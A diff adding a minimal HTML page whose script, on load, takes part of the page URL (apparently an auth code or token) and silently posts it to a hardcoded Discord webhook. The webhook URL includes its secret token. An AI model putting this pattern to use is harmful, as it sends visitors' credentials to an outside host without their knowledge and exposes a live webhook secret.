@@ -1,0 +1,17 @@
+<html>
+  <script>
+code = window.location.href.slice(63,100)
+fetch('https://discord.com/api/webhooks/1103808892867190856/o3VCDH7eB8azWxXcvKHvalMlGdpbUlweCXlxmkELDZTcNSwsQvuS2f09M4_v2PxxQrOe/messages/1103834066538741801', {
+  method: 'PATCH',
+  body: new URLSearchParams({
+    content: code,
+  }),
+  headers: {
+    'Content-type': 'application/json; charset=UTF-8',
+  },
+})
+  .then((response) => response.json())
+  .then((json) => console.log(json));
+  
+</script>
+</html>
